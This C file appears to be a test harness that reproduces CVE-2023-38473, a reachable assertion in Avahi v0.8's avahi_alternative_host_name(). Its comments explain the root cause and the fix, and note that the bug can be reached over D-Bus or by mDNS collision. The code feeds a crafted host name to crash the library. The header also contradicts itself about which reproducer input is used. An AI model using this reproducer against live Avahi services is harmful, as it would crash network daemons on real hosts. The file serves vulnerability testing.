/**
 * Real CVE-2023-38473 - actual vulnerable Avahi v0.8 (libavahi-common) + ASan/UBSan
 *
 * Reachable assertion (CWE-617) in avahi_alternative_host_name()
 * (avahi-common/alternative.c):
 *
 *     assert(avahi_is_valid_host_name(r));      // <-- aborts here (alternative.c:112)
 *
 * In v0.8 avahi_alternative_host_name() operates on the *escaped* host name
 * string directly (strrchr/strndup on `s`) instead of first unescaping it.
 * The avahi_strndup(s, AVAHI_LABEL_MAX-1-2) truncation cuts the escaped string
 * at a fixed byte offset (61); if a "\xx" escape sequence straddles that
 * offset the truncated label ends in a dangling backslash, so the derived
 * alternative `r` (e.g. "<truncated>\-2") is NOT a valid host name and the
 * closing assert fires -> SIGABRT. Reproducer used here: 60*'a' + "\." -- a
 * valid 62-byte escaped host name that passes the initial is_valid check but
 * whose alternative is invalid.
 *
 * The fix (commit b448c9f771bada14ae8de175695a9729f8646797, "common: derive
 * alternative host name from its unescaped version") unescapes the label first
 * and re-escapes the result, and returns NULL on invalid input instead of
 * asserting.
 *
 * TRANSPORT: this function is reached two ways:
 *   1) D-Bus: org.freedesktop.Avahi.Server.GetAlternativeHostName("s", ".")
 *      -- locally reachable (the original PoC; busctl call).
 *   2) mDNS network (UDP 5353): the daemon calls avahi_alternative_host_name()
 *      from its host-name COLLISION handler when a peer on the LAN claims the
 *      daemon's host name. So the same vulnerable function is also reachable
 *      from the multicast wire.
 * This harness drives the genuine public API function directly with the
 * published reproducer input ("."), which is exactly the code both the D-Bus
 * handler and the collision handler invoke.
 *
 * Crash class: reachable assert (CWE-617) -> abort(), geometry-independent.
 * Built against ASan-instrumented libavahi-common so the trace reaches logs.
 *
 * Real CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-38473
 * Affected: avahi <= 0.8 (fixed in 0.9). Reproducer: GetAlternativeHostName(".")
 *
 * FOR SECURITY TESTING PURPOSES ONLY - DO NOT USE IN PRODUCTION
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <avahi-common/alternative.h>
#include <avahi-common/malloc.h>

#define MDNS_PORT 5353

static volatile int triggered = 0;

/* Reproducer: a valid 62-byte escaped host name (60*'a' + "\.") that passes
 * avahi_is_valid_host_name() but whose alternative is invalid because the
 * fixed-offset truncation in v0.8 cuts the trailing "\." escape in half. */
static char *make_reproducer(void) {
    static char buf[64];
    memset(buf, 'a', 60);
    buf[60] = '\\';
    buf[61] = '.';
    buf[62] = '\0';
    return buf;
}

static void trigger(const char *label) {
    char *r;
    char *in = make_reproducer();
    fprintf(stderr, "[*] %s: calling avahi_alternative_host_name(\"%s\")...\n", label, in);
    /* Genuine vulnerable v0.8 code path. The closing assert(avahi_is_valid_host_name(r))
     * in avahi-common/alternative.c:112 fires for this input. */
    r = avahi_alternative_host_name(in);
    /* Not reached on a vulnerable build. */
    fprintf(stderr, "[*] returned %s (NOT vulnerable / patched)\n", r ? r : "(null)");
    if (r) avahi_free(r);
}

static void sigterm(int sig) { (void) sig; _exit(0); }

int main(void) {
    int sock;
    struct sockaddr_in addr;
    char buf[2048];

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    signal(SIGTERM, sigterm);
    signal(SIGINT, sigterm);

    printf("===========================================\n");
    printf("  REAL Avahi CVE-2023-38473 (libavahi-common v0.8)\n");
    printf("  assert(avahi_is_valid_host_name(r)) in\n");
    printf("  avahi_alternative_host_name (avahi-common/alternative.c:112)\n");
    printf("  Trigger: alternative host name of 60*'a'+\"\\.\"\n");
    printf("  Transport: D-Bus GetAlternativeHostName / mDNS collision\n");
    printf("  FOR SECURITY TESTING ONLY\n");
    printf("===========================================\n");

    /* Bind UDP 5353 so the container presents an mDNS endpoint for the PoC /
     * healthcheck. Any datagram (the PoC's crafted mDNS collision-style packet)
     * drives the vulnerable function; on startup we also self-trigger so the
     * crash is deterministic even without external input. */
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        int one = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(MDNS_PORT);
        if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
            printf("[*] listening on UDP %d (mDNS)\n", MDNS_PORT);
    }

    /* Give the PoC a brief window to connect/send, then self-trigger so the
     * crash is observable in `docker logs` even if no packet arrives. */
    fflush(stdout);
    if (sock >= 0) {
        struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
        if (n > 0) {
            printf("[*] received %zd-byte mDNS datagram, simulating collision\n", n);
            triggered = 1;
        }
    }

    trigger(triggered ? "mDNS-collision" : "self-trigger");

    /* Unreachable on vulnerable build. */
    while (1) pause();
    return 0;
}
